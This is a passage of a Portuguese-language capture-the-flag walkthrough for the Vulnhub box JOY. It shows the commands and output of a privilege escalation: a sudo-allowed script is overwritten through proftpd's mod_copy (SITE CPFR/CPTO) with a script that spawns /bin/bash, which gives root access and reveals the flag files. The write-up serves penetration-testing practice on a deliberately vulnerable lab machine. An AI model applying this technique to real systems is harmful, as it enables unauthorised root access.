-rw-r--r--  1 patrick patrick    24 Jul 13 03:20 gZHzKatMWjAnNBl8DSKI3jf755CQGqbhePscdvhCkDa8Tv6rNkKQL4pfCqYk79DY.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 03:05 h4ei6N4yRLsmyEjAZLwERryxoTM2HmhBClZLsC0sX0017zRVsJQTY5JNDQWiZCXG.txt
-rwxrwxrwx  1 patrick patrick     0 Jan  9  2019 haha
-rw-r--r--  1 patrick patrick    24 Jul 13 03:35 HwsfeeLRwaDbhAkbXxKB3iuoV3zKjuto8AKFFmpDWmy1Sy9EiuPrJ5VTc3H8B5HF.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 01:45 hXFBGrULW1GaEzEkLcyk6ItEQo7Ut009B6dWwuW2QM8F2b8Y3HeAUy3z2HX9Xf1V.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 02:30 hXI814pXuZBfWDa5qkaeDUTKzpqTm26A.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 02:50 i1m1rc1ogANwguzxEUBJxmgIlgPzODj7EJIppUuKTennpHZqKKKtApqHKzejQSmE.txt
-rw-------  1 patrick patrick  8532 Jan 28  2019 .ICEauthority
-rw-r--r--  1 patrick patrick    24 Jul 13 01:55 idf7AYd0XJY08fyTAYxHSFy6b5GdHySWvRapc3gRa7AM5zLYGc8pKLcA3tXvWT3i.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 00:55 IuotXD4hMBnDMTlyWJuuqMgCkOjga1mv90BSrngnRInrRAjR1GR8osVbx3n4Qscx.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 01:25 jHbkzVnrFNGMpciuk0DtA83l26tHrVRCoz4153Po2X04och3w1RWB0mMSa6UAIHZ.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 01:15 JZylzCc3ALvLDe6vHNr4cC3I39p2eBSf1zhYoaIrbp0aqEfEqf4SqTFfdUTXOXyD.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 02:35 K4F8SmniXvElVhCsi9yqIweemcizH9UAVYFrntHIZ4NPjQ8iXLlNWQQO5feDmzKK.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 03:15 kAENHkiGfXLCFTjErsXZbKnW8Fto4azD.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 01:35 kJFnhdRHuqwU22b1GTK0JwnfV5ID8SFH.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 02:05 KKld5IH8LHftCxKzNBAe3REm56M7Ql94.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 01:00 kLNjdexPu7Eom3anHp2rDmqsvrPAtoQs.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 02:35 kTRinNxEvhwkoXdyArSjvMR9xPuGUJN8.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 03:20 liCLmk0lRHUJZc1HXwBCeH7YMVC7lopk.txt
drwxr-xr-x  3 patrick patrick  4096 Dec 26  2018 .local
-rw-r--r--  1 patrick patrick    24 Jul 13 02:00 lrFyN6nAqo41QQZeTxYplPvhvcy7ZtllvrlJRUT5VqLs6P7os0qTUVNoEKcODU3J.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 02:05 ModaNi1y7CU5LAo2EHKZPaLeWuyds6AodRDp2OHRgOF6nksX3jzQDjpgwffvtnFS.txt
drwx------  5 patrick patrick  4096 Dec 28  2018 .mozilla
drwxr-xr-x  2 patrick patrick  4096 Dec 26  2018 Music
drwxr-xr-x  2 patrick patrick  4096 Jan  8  2019 .nano
-rw-r--r--  1 patrick patrick    24 Jul 13 03:25 nQosHDmULAvoU2Yrl5C5Lcg4TadcU6ub9wduCHAumWZkXTuHAhWEzgKCMqYekcIn.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 03:00 P5Kuh1tdMPz19O2sPubr15rVII68WeG4SgzNidzPJpTYUEzRpxEMsOEmFC8nfl5d.txt
drwxr-xr-x  2 patrick patrick  4096 Dec 26  2018 Pictures
-rw-r--r--  1 patrick patrick     0 Jul 13 03:25 PJRcO1BTLy0uEWq7jSfKZg8l1r7G7R8W.txt
-rw-r--r--  1 patrick patrick   675 Dec 23  2018 .profile
-rw-r--r--  1 patrick patrick    24 Jul 13 02:40 pSPVyrRAwQqlFZdvtqCWJQjdeB9vGNz0MyOlDaxhr1bnwJhc98yP419mrhocTuxF.txt
drwxr-xr-x  2 patrick patrick  4096 Dec 26  2018 Public
-rw-r--r--  1 patrick patrick    24 Jul 13 01:40 QEGfrxSHS5NMQgdMmW7Mce0k2ilt43JHCSmX2YED0AybrrDogqSp4awUos914dPZ.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 02:10 qh7ckPnVaHEqQi8k4FYJcXZrFXj7NCZy.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 03:10 Qixak3cwBtXYrJKLok5lx8yGSYPm6eO7xaovC2HKz41GzyHuSmc3fZHtgVnL5JSd.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 01:40 QpQC66TCVaSnzwk6ZwJhoWhv45B68iY4.txt
d---------  2 root    root     4096 Jan  9  2019 script
drwx------  2 patrick patrick  4096 Dec 26  2018 .ssh
-rw-r--r--  1 patrick patrick     0 Jan  6  2019 Sun
-rw-r--r--  1 patrick patrick     0 Jul 13 03:00 SXG06lqj6wAjdtClvIxozdEjvQ0b4KNJ.txt
drwxr-xr-x  2 patrick patrick  4096 Dec 26  2018 Templates
-rw-r--r--  1 patrick patrick    24 Jul 13 03:30 THo2JNttazAp1awqy8JeszmfNF43H08O7ytwjZWZsBhiSD6vUFBQHt51qqcEtbfK.txt
-rw-r--r--  1 patrick patrick     0 Jan  6  2019 .txt
-rw-r--r--  1 patrick patrick     0 Jul 13 02:15 ue1Y5gbizfO9dzvysuTrLJRZeLLOcP2l.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 03:35 up4x3hTHlg9FFWR9NCsLAAjkXNf6gFzz.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 01:05 uWTNjar36FCqrF2h83ldlwSrUjrOj4qdeDyG0WwxSPE0nnhuMfl7upfEXpnzZLSU.txt
-rw-r--r--  1 patrick patrick   407 Jan 27  2019 version_control
-rw-r--r--  1 patrick patrick    24 Jul 13 01:35 VHXNo7w0JuGSo9HoUsyUpnlrst0TkOGQ1NRCxPbZsl7rF6wzIC0rOp63Ob3YzTiO.txt
drwxr-xr-x  2 patrick patrick  4096 Dec 26  2018 Videos
-rw-r--r--  1 patrick patrick     0 Jul 13 02:45 VVuAyt9JdpCGFOkvlNgMA2RU9vf2mPPv.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 02:20 Wf2yL8BWuYFG168ZHJlP31P34JcenyJr.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 01:05 wQ4aboIxxPsyBCnLtGsbzRF7mvOcLSG3.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 02:20 wYhgMEMMon9Pcd5hSN7ucCqrTWuapKIHLfLR0lNWajiem08FaudymiDCIFM054Mw.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 03:05 xUln8enHQNJFI0FNQMTAOFEMF13F85xg.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 01:10 xURTrWMrRRGB5qKuWGTCFAlTHejeFX9nyYbOJsYBNpOMwDxtPdiKUBopr9LJX9SI.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 02:55 xZrdkAQ1C2NqZORpzMEkHvSRxOUnUggIUFQGiIxGTHBDQw0R97CcfmF7P8iQUjBE.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 02:50 yu0pEiI2iwd6B2QotsCSIEv4LW12uw1h.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 01:45 YW6KnhOb7pHKw1K0ELa6ybwDyqesHYpN.txt
-rw-r--r--  1 patrick patrick    24 Jul 13 02:10 ZajX17xerpk4Ab8vdHHbGIWsU1tH9DJdzfRWky62OoB0YHeNvFcU7QMjwJceMf9J.txt
-rw-r--r--  1 patrick patrick     0 Jul 13 02:25 Ztp7Kl7Ud4Vmfl5ddbzHaSHPe6RPc22o.txt
patrick@JOY:/var/www/tryingharderisjoy$ cd /home/patrick

```

Opa... Aqui podemos ver script. Vamos ver o que o patrick pode executar com privilégio de root.

```bash
patrick@JOY:~$ sudo -l
sudo -l
Matching Defaults entries for patrick on JOY:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User patrick may run the following commands on JOY:
    (ALL) NOPASSWD: /home/patrick/script/test

```

Maravilha! Parece que ele pode executar /home/patrick/script/test com privilégio de root.
Vamos tentar executá-lo.

```bash
atrick@JOY:~$ sudo /home/patrick/script/test
sudo /home/patrick/script/test
I am practising how to do simple bash scripting!
What file would you like to change permissions within this directory?
test
test
What permissions would you like to set the file to?
777
777
Currently changing file permissions, please wait.
chmod: cannot access '/home/patrick/script/test': No such file or directory
Tidying up...
Done!

```

Muito bem... Lembra que o mod_copy do proftpd está habilitado? Isso quer dizer que podemos fazer upload de arquivos e movê-lo para onde quisermos arbitrariamente. Vamos criar o nosso test e copiá-lo para o /home/patrick/script/

```bash
┌──(kali㉿kali)-[~]
└─$ nano test
```

```test
#!/bin/bash
/bin/bash
```

Agora logamos no ftp e subimos esse script pra lá.

```bash
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.56.14
Connected to 192.168.56.14.
220 The Good Tech Inc. FTP Server
Name (192.168.56.14:kali): ftp
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||52849|)
150 Opening ASCII mode data connection for file list
drwxrwxr-x   2 ftp      ftp          4096 Jan  6  2019 download
drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
226 Transfer complete
ftp> cd upload
250 CWD command successful
ftp> put test
local: test remote: test
229 Entering Extended Passive Mode (|||28479|)
150 Opening BINARY mode data connection for test
100% |********************************|    25       89.10 KiB/s    00:00 ETA
226 Transfer complete
25 bytes sent in 00:00 (4.54 KiB/s)
ftp> quit
221 Goodbye.

```

Agora, conectamos via telnet para fazer SITE CPFR e SITE CPTO

```bash
──(kali㉿kali)-[~]
└─$ telnet 192.168.56.14 21
Trying 192.168.56.14...
Connected to 192.168.56.14.
Escape character is '^]'.
220 The Good Tech Inc. FTP Server
site cpfr /home/ftp/upload/test
350 File or directory exists, ready for destination name
site cpto /home/patrick/script/test
250 Copy successful
quit
221 Goodbye.
Connection closed by foreign host.

```

Pronto, agora é só voltarmos ao metasploit e executarmos o script que foi substituído pelo nosso.

```bash
patrick@JOY:~$ sudo script/test
sudo script/test
root@JOY:/home/patrick# ls /root
ls /root
author-secret.txt      dovecot.crt  dovecot.key     proof.txt   rootCA.pem
document-generator.sh  dovecot.csr  permissions.sh  rootCA.key  rootCA.srl
root@JOY:/home/patrick# cat /root/proof.txt
cat /root/proof.txt
Never grant sudo permissions on scripts that perform system functions!
root@JOY:/home/patrick# cat /root/author-secret.txt
cat /root/author-secret.txt
Thanks for joining us!

If you have not rooted MERCY, DEVELOPMENT, BRAVERY, TORMENT, please root them too!

This will conclude the series of five boxes on Vulnhub for pentesting practice, and once again, these were built while thinking about OffSec in mind. :-)

For those who have helped made videos on rooting these boxes, I am more than grateful for your support. This means a lot for the box creator and those who have helped test these boxes. A shoutout to the kind folk from Wizard Labs, Zajt, as well as friends in the local security community which I belong to.

If you found the boxes a good learning experience, feel free to share them with your friends.

As of the time of writing, I will be working on (building) some boxes on Wizard-Labs, in a similar flavour to these boxes. If you enjoyed these, consider pinging them and their project. I think their lab is slowly being built into a nice lab with a variety of machines with good learning value.

I was rather glad someone found me on Linkedin after breaking into these boxes. If you would like to contact the author, you can find some of the author's contact points on his website (https://donavan.sg).

May the r00t be with you.

P.S. Someone asked me, also, about "shesmileslikeabrightsmiley". Yes, indeed, she smiles like a bright smiley. She makes me smile like a bright smiley too? :-)

```

Obrigado ao donavan que aparentemente é o autor desse ctf. Muito bom!